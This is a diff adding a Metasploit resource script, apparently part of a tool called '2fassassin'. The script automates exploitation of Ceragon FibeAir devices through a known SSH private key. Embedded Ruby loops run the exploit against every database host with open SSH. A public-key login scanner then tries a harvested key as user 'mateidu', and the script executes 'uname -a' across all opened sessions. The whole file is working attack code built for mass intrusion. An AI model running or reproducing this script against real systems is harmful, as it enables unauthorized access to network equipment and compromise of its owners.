@@ -1,0 +1,40 @@
+use exploit/linux/ssh/ceragon_fibeair_known_privkey
+set VERBOSE true
+spool /root/.msf4/loot/ceragon_fibeair_known_privkey
+set THREADS 1
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "ssh" and service.state == "open"
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("run")
+      self.run_single("exit -y")
+    end
+  end
+end
+</ruby>
+
+use auxiliary/scanner/ssh/ssh_login_pubkey
+set KEY_PATH /root/2fassassin/check/vuln/ceragon/private
+set username mateidu
+set stop_on_success true
+set VERBOSE true
+spool /root/.msf4/loot/ssh_login_pubkey.txt
+set THREADS 2
+
+<ruby>
+framework.db.hosts.each do |host|
+  host.services.each do |service|
+    if service.name == "ssh" and service.state == "open"
+      self.run_single("set RHOSTS #{host.address}")
+      self.run_single("set RPORT #{service.port}")
+      self.run_single("run")
+      self.run_single("show sessions")
+      self.run_single("sessions -c 'uname -a' all")
+      self.run_single("exit -y")
+    end
+  end
+end
+</ruby>
